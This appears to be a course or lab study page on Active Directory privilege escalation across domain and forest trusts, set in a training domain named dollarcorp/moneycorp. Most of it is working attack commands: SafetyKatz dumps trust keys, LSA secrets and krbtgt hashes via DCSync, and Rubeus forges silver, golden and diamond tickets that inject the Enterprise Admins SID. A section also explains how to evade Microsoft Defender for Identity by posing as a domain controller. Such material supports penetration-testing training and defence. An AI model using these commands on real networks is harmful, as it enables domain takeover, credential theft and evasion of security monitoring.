# 7.6 - Accross Trusts

### Privilege Escalation Across Trusts

#### Trusts Between Domains and Forests

In Active Directory environments, trust relationships determine how authentication requests are handled across domain or forest boundaries.

* **Inter-Domain Trusts (Same Forest)**:\
  By default, domains within the same forest have an implicit, bidirectional trust. This allows users in one domain to access resources in another, subject to appropriate permissions.
* **Inter-Forest Trusts**:\
  Trust relationships between separate forests must be explicitly created. These trusts can be one-way or two-way and are necessary for cross-forest authentication and resource access.

***

### Escalating Privileges to Enterprise Admins

#### Using `sIDHistory` for Privilege Escalation

The `sIDHistory` attribute stores previous SIDs for a user account, typically used during domain migrations to preserve access rights. This mechanism can be abused to escalate privileges across domains or forests by injecting the SID of a high-privilege group (e.g., Enterprise Admins).

There are two main methods for exploiting this:

1. **Using the `krbtgt` Hash from the Child Domain**
2. **Forging Trust Tickets (Inter-Realm TGTs)**

***

#### Method 1: Forging Trust Tickets

To forge inter-realm TGTs (trust tickets), the attacker needs access to the **inter-domain trust key** (the shared secret used between the child and parent domains).

**Retrieving the Trust Key**

The trust key can be obtained from the child domain controller using:

```bash
SafetyKatz.exe "lsadump::trust /patch"
```

Alternatively, it can be retrieved using DCSync or LSA secrets:

```bash
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
SafetyKatz.exe "lsadump::lsa /patch"
```

**Forging the Ticket with Rubeus**

```bash
Rubeus.exe silver
/service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
/rc4:<trust_key_ntlm_hash>
/sid:<child_domain_sid>
/sids:<enterprise_admins_sid_from_parent>
/user:Administrator
/ldap
/nowrap
```

Then, use the forged TGT to request service tickets:

```bash
Rubeus.exe asktgs
/service:http/mcorp-dc.MONEYCORP.LOCAL
/dc:mcorp-dc.MONEYCORP.LOCAL
/ptt
/ticket:<FORGED_TGT>
```

***

#### Rubeus Silver Ticket Options (Summary)

* `/rc4`: NTLM hash of the trust key
* `/sid`: SID of the child domain
* `/sids`: SID of the Enterprise Admins group (from the parent domain)
* `/user`: Username to impersonate
* `/ldap`: Pull PAC data via LDAP
* `/nowrap`: Output formatting option

***

#### Method 2: Forging Golden Tickets with `krbtgt` Hash

This method is simpler and does not require trust ticket generation. Instead, it uses the `krbtgt` hash of the **child domain** to forge a normal Golden Ticket and adds the SID of the Enterprise Admins group from the **parent domain** to the `sIDHistory`.

**Example (using SafetyKatz)**

```bash
SafetyKatz.exe "kerberos::golden /user:Administrator
/domain:dollarcorp.moneycorp.local
/sid:<child_domain_sid>
/sids:<enterprise_admins_sid>
/krbtgt:<krbtgt_hash> /ptt" "exit"
```

This works because the parent domain trusts the child’s tickets due to the established trust relationship.

***

#### Bypassing Detection (MDI, Logging)

To evade suspicious logs and Microsoft Defender for Identity (MDI), impersonate a domain controller:

```bash
SafetyKatz.exe "kerberos::golden
/user:dcorp-dc$ /id:1000
/domain:dollarcorp.moneycorp.local
/sid:<child_domain_sid>
/sids:<enterprise_admins_sid>,S-1-5-9
/krbtgt:<krbtgt_hash> /ptt" "exit"
```

Use DCSync to extract the parent domain’s krbtgt hash:

```bash
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Relevant SIDs:

* `S-1-5-21-...-516`: Domain Controllers group
* `S-1-5-9`: Enterprise Domain Controllers group

***

#### Using Rubeus for Golden Ticket Forgery

```bash
Rubeus.exe golden
/aes256:<krbtgt_aes256_key>
/user:dcorp-dc$ /id:1000
/domain:dollarcorp.moneycorp.local
/sid:<child_domain_sid>
/sids:<enterprise_admins_sid>,S-1-5-9
/dc:DCORP-DC.dollarcorp.moneycorp.local
/ptt
```

***

#### Using Rubeus Diamond Ticket to Bypass MDI

Diamond tickets are specially crafted Golden Tickets designed to evade detection mechanisms.

```bash
Rubeus.exe diamond
/krbkey:<krbtgt_aes256_key>
/tgtdeleg /enctype:aes
/ticketuser:dcorp-dc$ /ticketuserid:1000
/domain:dollarcorp.moneycorp.local
/dc:dcorp-dc.dollarcorp.moneycorp.local
/sids:<enterprise_admins_sid>,S-1-5-9
/createnetonly:C:\Windows\System32\cmd.exe
/show /ptt
```

Use DCSync to extract the parent krbtgt hash if not already done:

```bash
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
